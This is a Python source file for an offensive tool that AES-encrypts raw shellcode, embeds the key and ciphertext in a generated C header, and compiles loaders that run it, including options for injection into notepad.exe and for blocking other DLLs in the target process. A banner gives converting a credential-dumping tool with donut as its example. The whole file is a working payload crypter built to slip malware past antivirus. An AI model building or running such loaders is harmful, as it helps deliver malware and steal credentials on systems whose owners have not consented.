import sys, os, argparse
from base64 import encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
from ctypes import *

WARNING_MSG = """
###############################################################################
#                                                                             #
#  Large binaries should use either the runner_big or runner_big_DLL options  #
#  or you will wait a LONG time for decryption. The runners _big will run     #
#  say, donut [redacted]katz.exe -o mimi.bin -p coffee, in about a min        #
#                                                                             #
###############################################################################
"""

TEMPLATE = """
#define X64PROC "%s"
#define CMDLINE "%s"
#define PAYLOAD_HASH %s
#define ENCRYPTED_BIN_LEN %s
#define OG_PAYLOAD_LEN %s


uint8_t iv[]  = { %s };
uint8_t key[] = { %s };

unsigned char encrypted_instructions[ENCRYPTED_BIN_LEN] = { %s };
"""


def format_shellcode(shellcode):
    hshellcode = ""
    code_size = len(shellcode)
    for num, byte in enumerate(shellcode):
        if num != code_size - 1:
            hshellcode += f"{hex(byte)},"
        else:
            hshellcode += f"{hex(byte)}"
    return hshellcode


# arguments
verbose = False
parser = argparse.ArgumentParser(description="generate AES-CBC encrypted shellcode runners")
parser.add_argument('-inbin', type=str, help=".bin file")
parser.add_argument('-execmethod', type=str, choices=[
    'section_inject', 
    'section_runner', 
    'section_runner_dll', 
    'section_runner_big', 
    'section_runner_big_dll', 
    'runner', 
    'runner_dll', 
    'runner_big_blockddls', 
    'runner_big_blockddls_dll', 
    'runner_blockdlls', 
    'runner_blockdlls_dll'], 
    default="runner_dll")
parser.add_argument('--process', type=str, help="process to inject (only with \'section_inject\')", default="notepad.exe", required=False)
parser.add_argument('--cmdline', type=str, default="notepad", help="cmdline argument to show (only with \'section_inject\')", required=False)
parser.add_argument('--verbose', default=False, action='store_true', dest='verbose')
args = parser.parse_args()
input_filename = args.inbin
exec_method = args.execmethod


# get hash value of payload with sfh.c
# cc -fPIC -shared -o sfh.so sfh.c 
sfh_so = "./sfh.so"
sfh = CDLL(sfh_so)
SuperFastHash = sfh.SuperFastHash
SuperFastHash.argtypes = [c_char_p, c_uint32]
SuperFastHash.restype = c_uint32

try:
    with open(input_filename, "rb") as file: data = file.read()
except FileNotFoundError:
    print(f"\n\n[!] {input_filename} not found.\n")
    exit(1)
data_len = c_uint32(len(data))
res = SuperFastHash(data, data_len)

# encrypt payload
key = get_random_bytes(16)
iv = get_random_bytes(16)
cipher = AES.new(key=key, mode=AES.MODE_CBC, iv=iv, )
encrypted_data = cipher.encrypt(pad(data, AES.block_size))

payload_hash = res
e_len = len(encrypted_data)
if e_len >= 1000000: print(WARNING_MSG)
og_len = data_len.value
hex_iv = format_shellcode(iv)
hex_k = format_shellcode(key)
e_shc = format_shellcode(encrypted_data)

# create variables for config.h
if exec_method == "section_inject":
    proc = args.process
    proc_cmdline = args.cmdline
    config_h = TEMPLATE % (proc, proc_cmdline, payload_hash, e_len, og_len, hex_iv, hex_k, e_shc)
else:
    proc = ""
    proc_cmdline = ""
    config_h = TEMPLATE % (proc, proc_cmdline, payload_hash, e_len, og_len, hex_iv, hex_k, e_shc)

with open("new_config.h", "w") as f:
   f.write(config_h)

# make the binary
if args.verbose:
    print("\n\n\n[*] Printing new_config.h\n\n")
    print(config_h)
    print("\n\n[+] compiling . . .")
    files_before = len(os.listdir("./"))
    os.system(f"make {exec_method}")
    if len(os.listdir("./")) > files_before: print("[*] successfull!") # yup, this is the check
    else: print(f"\n[!] failed. Run \"make {execmethod}\" to see the errors")
else:
    files_before = len(os.listdir("./"))
    os.system(f"make {exec_method} 1>/dev/null 2>&1")
    if len(os.listdir("./")) > files_before: pass 
    else: print(f"\n[!] failed. Run \"make {execmethod}\" to see the errors")
